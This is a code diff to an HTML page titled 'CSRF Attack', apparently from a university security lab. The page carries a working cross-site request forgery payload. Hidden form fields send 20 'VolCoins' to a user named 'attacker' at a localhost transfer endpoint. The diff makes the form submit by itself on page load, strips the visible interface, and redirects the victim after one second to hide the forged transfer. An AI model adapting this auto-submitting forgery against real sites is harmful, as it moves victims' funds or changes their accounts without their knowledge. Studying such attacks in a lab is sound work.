@@ -5,21 +5,24 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CSRF Attack</title>
+    <script type="text/javascript">
+        function submitForm() {
+            document.getElementById("csrfForm").submit();
+        }
+        window.onload = submitForm;
+    </script>
 </head>
 <body>
-    <h3>Transfer VolCoins</h3>
-    <form class="pure-form pure-form-stacked" action="http://localhost:3000/post_transfer" method="post">
+    <form id = "csrfForm" action="http://localhost:3000/post_transfer" method="post">
         <input type="hidden" name="destination_username" value="attacker">
         <input type="hidden" name="quantity" value="20">
-        <p>You currently have 1100 volCoins.</p>
-        <button id="transferButton">Transfer</button>
     </form>
     <script>
         window.onload = function() {
-            document.getElementById("transferButton").click(); // Submit the form
+            submitForm();
             setTimeout(function(){
                 window.location.href = "https://eecs.utk.edu/";
-            }, 1000); // Redirect after 1 second
+            }, 1000);
         }
     </script>
 </body>
